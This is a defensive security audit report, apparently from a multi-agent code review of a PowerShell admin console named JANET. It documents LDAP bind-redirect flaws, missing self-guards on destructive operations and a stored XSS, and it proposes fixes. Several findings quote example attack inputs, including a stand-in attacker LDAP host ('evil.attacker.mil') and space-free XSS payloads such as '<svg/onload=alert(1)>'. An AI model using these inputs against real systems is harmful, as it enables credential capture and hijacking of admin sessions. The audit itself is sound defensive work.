# Fable 5 Review - Loop 5 of 8 - 2026-07-12

Scope: the delta since the loop-4 audit (`git diff 0a60139..HEAD`) was a single **test-only** commit
(`a4f48a1`) - zero production change. Rather than re-scan an unchanged surface a fifth time, this iteration
ROTATED the adversarial lens onto the under-audited surface loops 1-4 never reached: the web/JS view layer
(XSS/DOM sinks), the HttpListener server + auth/dispatch core (`server\JanetWeb.Server.ps1`), and the
certdeploy / adsearch / adto / upr / winupgrade / secureboot / dhcp engines. Four reviewers (2 Opus deep +
1 Sonnet engine sweep + 1 Opus prior-fix re-verify). **Every P1/P2 below was spot-verified by me against the
actual code before entering this report.**

**Rating: RED.** Three P1 + two P2 - all pre-existing, all on the rotated surface, none in the (still-clean)
c2c/self-guard code. All 12 prior fixes remain CLOSED-AND-CLEAN and the loop-4 delta is production-inert.

## P1 (fix first - priority-ordered)

**P1-1. `adsearch.psm1:288-301` - LDAP bind-redirect via unvalidated `SearchBase`, reachable with NO admin
session.** The operator `SearchBase` param is prefixed `LDAP://` (`:291`) and bound via `New-AdEntry`
(`:192-208` -> `New-Object DirectoryEntry($Path,$u,$p)` credentialed, or `[ADSI]$Path` under the JANET
service identity when no cred is set), and the bind is FORCED immediately (`:299` `NativeObject`). There is NO
DN validation. `search-*` actions are `destructive=$false`, so the server gate (`Server.ps1:737`) never
applies - a `SearchBase` of `evil.attacker.mil` coerces whatever identity runs the search (the JANET
machine/service account in the credential-less case) to authenticate to an attacker LDAP listener
(coerced-auth / credential-capture). **The codebase already knows this threat** - `adto.psm1:339-345` guards
the identical pattern; adsearch was missed. *Verified: `:288-301`, `New-AdEntry` `:192-208`.*

**P1-2. `adto.psm1:418-422` and `:475-479` - same bind-redirect on the CREDENTIALED, destructive write
paths (leaks the admin AD credential).** `adto`'s `scan` validates `SearchBase` (`:342`, DN-shape + no
path chars). But `Invoke-AdToFix` (confirm=FIX) and `Invoke-AdToValidate` (validate-iao, confirm=VALIDATE,
IAO-gated) take the per-object `dn` straight from the client `plan` JSON (`$e.dn`, `:418`/`:475`) into
`New-AdToEntry -Dn $dn -Credential` (`:400-406` -> `New-Object DirectoryEntry("LDAP://$Dn",$u,$p)`) with NO
validation. A crafted plan entry `{"dn":"evildc.attacker.mil/DC=x", ...}` redirects the credentialed bind -
and the write - to an attacker LDAP, exposing the operator's domain credential. Admin-session gated, but a
local token-holder or a chained XSS (see P2-1) can forge the plan POST. *Verified: `New-AdToEntry` `:400-406`;
call sites `:418/:422/:433/:475/:479`.*

**P1-3. `upr.psm1:1550-1570` - self-guard wired into `report-uninstall` but ABSENT from `manual-uninstall`.**
`Test-UprHostIsSelf` (`:1327`) is called in `Build-UprHostJobs` (the ACAS-report job builder) but
`Build-UprManualHostJobs` (the Targeted-Uninstall path, `destructive=$true`) filters pasted hosts only via
`Test-UprValidTarget` (junk filter) - no self-guard. If the JANET dispatcher hostname is in the pasted host
list, software is uninstalled FROM the JANET box itself (wildcard software match -> auto-`Uninstall`, no
catalog gate). Class-5 "guard defined but not wired into the destructive path." *Verified: `:1550-1570` vs the
guarded `:1369`.*

## P2 (fix this iteration)

**P2-1. `dhcp.view.js:316-323` `diffText()` - unescaped remote DHCP option values -> stored XSS in the
privileged console.** `diffText()` joins `added`/`removed` raw (`added.join(', ')`) into markup, and that
string is concatenated into the ConfirmDialog `body` (`:331`, while the neighboring fields ARE `esc()`-wrapped)
-> `confirmdialog.js:57` `p.innerHTML = String(opts.body)` (the app's one raw-HTML sink). The values derive
from `r.Values` (`:307`) returned by the REMOTE DHCP server, unvalidated (`isIpv4()` guards only the manual
add-input, not the server-load path). Free-form string options (015/066/067/012) can carry a payload; the
`/[,;\s]+/` split at `:307` fragments space/`;` payloads, but a **space-free** payload
(`<svg/onload=alert(1)>`, `<img/src/onerror=...>`) survives as one token and executes in the operator's admin
session (WinRM creds, all tools). *Verified: `diffText` `:316-323`, sink `confirmdialog.js:57`, source `:307`.*
**Fix:** `added.map(esc).join(', ')` / `removed.map(esc).join(', ')`.

**P2-2. `winupgrade.psm1:2924-2949` - self-guard scoped to `$rebootIntent` only.** `Test-WinUpgradeHostIsSelf`
runs only when `$rebootIntent -and -not $dryRun` (`:2935`), true only for reboot-flagged UpgradeDrive/
InstallCab/SetPageFile/RepairHealth/AutoFix. `Pin`/`Unpin`/`ForceDiscovery` (aggressive mode STOPS WU +
renames SoftwareDistribution/catroot2) and the same ops with the reboot box unticked carry NO self-exclusion -
the dispatcher can be pinned, cache-reset, or put through a 45-min DISM/SFC against itself. Every other module
applies the self-guard unconditionally to the destructive dispatch. *Verified: `:2933-2938`.*

## Server-core findings (documented; hardening, not emergency)
- **Latent P2 - destructive gate defaults OPEN (`Server.ps1:736`).** `$isDestructive` trusts each action's
  manifest `destructive` flag; an action that changes state but omits the flag is treated read-only and runs
  with no session. The ACAS by-id case was already special-cased (proving the class). Manifests currently DO
  flag explicitly (185 flags across 22 modules), so no confirmed current bypass - but the default should be
  fail-closed. -> DESIGN candidate (default-deny).
- **P3 - per-launch token on the browser-open argv (`Server.ps1:159-161`, `Internal.ps1:126`),** readable by
  any local process via `Win32_Process`; drives the admin API while a session is armed. Operator-local trust
  model; documented.
- Otherwise the server core is well-built: path-traversal confined (`:325-327`), ActionId allow-listed twice,
  no `Invoke-Expression`, credentials never serialized/logged/disk-written, single-thread accept (no
  session-store race), exceptions not leaked to clients, strict CSP + `X-Janet-Token` anti-CSRF.

## Clean (verified)
Web layer is otherwise closed: ResultsGrid/ActivityLog render via `textContent`/`createTextNode`, `esc()`
used pervasively across ~50 ConfirmDialog callers, no `eval`/`javascript:`/`document.write` of remote data.
certdeploy (no private-key export, `confirm='DEPLOY'` + unconditional self-guard + additive store writes +
narrow expired-CA allowlist), secureboot (SYSTEM-ACL'd password file, hostname allowlist, secrets nulled),
upr uninstall execution (strict ProductCode GUID + array args, no shelled UninstallString), and adsearch
FILTER construction (`Escape-LdapFilterValue` on every value) are all solid. All 12 prior fixes CLOSED-AND-CLEAN;
loop-4 delta production-inert.

## Fix order
1. P1-1 adsearch SearchBase DN-guard (port `adto.psm1:342`).
2. P1-2 adto fix + validate-iao per-object `dn` DN-guard.
3. P1-3 upr `Build-UprManualHostJobs` self-guard (mirror `Build-UprHostJobs`).
4. P2-1 dhcp `diffText()` escape.
5. P2-2 winupgrade unconditional self-guard for destructive host-touching ops.
Each: Opus/Sonnet-implemented, gated, PS5.1 parse-clean + BOM, full Pester green before commit.
